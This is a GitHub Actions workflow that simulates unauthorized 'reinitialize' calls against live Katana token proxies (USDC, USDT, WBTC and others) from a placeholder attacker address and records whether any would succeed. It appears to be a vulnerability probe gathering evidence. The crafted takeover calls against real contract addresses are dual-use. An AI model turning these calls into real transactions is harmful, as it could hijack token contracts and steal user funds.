name: Katana CustomToken reinitializer probe v2

on:
  pull_request:
    branches: [main]
    paths:
      - '.github/workflows/katana-customtoken-reinitializer-probe-v2.yml'
      - 'katana-reinit-v2/**'

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
          fetch-depth: 1

      - name: Install authenticated Foundry toolchain
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p /tmp/foundry evidence
          curl --fail --location --retry 4 --retry-all-errors \
            https://github.com/foundry-rs/foundry/releases/download/v1.7.1/foundry_v1.7.1_linux_amd64.tar.gz \
            --output /tmp/foundry.tar.gz
          echo 'cf7e688ed0c4c48adffca788b496076e31060b67ac5afe1e43dbb5499c20c88b  /tmp/foundry.tar.gz' \
            | sha256sum --check --strict
          tar -xzf /tmp/foundry.tar.gz -C /tmp/foundry
          echo /tmp/foundry >> "$GITHUB_PATH"

      - name: Simulate exact v0.5.1 reinitialize calls on CustomToken proxies
        shell: bash
        env:
          RPC_URL: https://rpc.katana.network/
        run: |
          set -euo pipefail
          ATTACKER=0x1111111111111111111111111111111111111111
          BRIDGE=0x2a3dd3eb832af982ec71669e178424b10dca2ede
          IMPL_SLOT=0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
          : > evidence/probes.txt

          probe() {
            label="$1"; token="$2"; converter="$3"
            name=$(cast call "$token" 'name()(string)' --rpc-url "$RPC_URL")
            symbol=$(cast call "$token" 'symbol()(string)' --rpc-url "$RPC_URL")
            decimals=$(cast call "$token" 'decimals()(uint8)' --rpc-url "$RPC_URL")
            implementation=$(cast storage "$token" "$IMPL_SLOT" --rpc-url "$RPC_URL")
            version=$(cast call "$token" 'version()(string)' --rpc-url "$RPC_URL" 2>&1 || true)
            current_converter=$(cast call "$token" 'nativeConverter()(address)' --rpc-url "$RPC_URL" 2>&1 || true)
            {
              echo "=== $label ==="
              echo "token=$token"
              echo "expected_converter=$converter"
              echo "current_converter=$current_converter"
              echo "implementation=$implementation"
              echo "version=$version"
              echo "name=$name"
              echo "symbol=$symbol"
              echo "decimals=$decimals"
              set +e
              out=$(cast call "$token" \
                'reinitialize(address,string,string,uint8,address,address)' \
                "$ATTACKER" "$name" "$symbol" "$decimals" "$BRIDGE" "$ATTACKER" \
                --from "$ATTACKER" --rpc-url "$RPC_URL" 2>&1)
              status=$?
              set -e
              echo "exit=$status"
              echo "$out"
              echo
            } >> evidence/probes.txt
          }

          probe USDC 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36 0x97a3500083348a147f419b8a65717909762c389f
          probe USDT 0x2DCa96907fde857dd3D816880A0df407eeB2D2F2 0x053fa9b934b83e1e0ffc7e98a41aadc3640bb462
          probe WBTC 0x0913DA6Da4b42f538B445599b46Bb4622342Cf52 0xb00aa68b87256e2f22058fb2ba3246eec54a44fc
          probe USDS 0x62D6A123E8D19d06d68cf0d2294F9A3A0362c6b3 0x639f13d5f30b47c792b6851238c05d0b623c77de
          probe WETH 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62 0xa6b0db1293144ebe9478b6a84f75dd651e45914a

          python3 - <<'PY'
          import json
          from pathlib import Path
          text=Path('evidence/probes.txt').read_text()
          rows=[]
          for section in text.split('=== ')[1:]:
              lines=section.splitlines()
              label=lines[0].strip(' =')
              fields={}
              for line in lines[1:]:
                  if '=' in line:
                      k,v=line.split('=',1)
                      fields[k]=v
              rows.append({'label':label,**fields})
          open_rows=[row for row in rows if row.get('exit')=='0']
          verdict={'open':bool(open_rows),'open_rows':open_rows,'rows':rows}
          Path('evidence/verdict.json').write_text(json.dumps(verdict,indent=2,sort_keys=True)+'\n')
          print(json.dumps(verdict,indent=2,sort_keys=True))
          PY
          (cd evidence && sha256sum * > SHA256SUMS)

      - name: Upload corrected reinitializer evidence
        uses: actions/upload-artifact@v4
        with:
          name: katana-customtoken-reinitializer-v2-${{ github.run_id }}
          path: evidence/
          if-no-files-found: error
          retention-days: 1
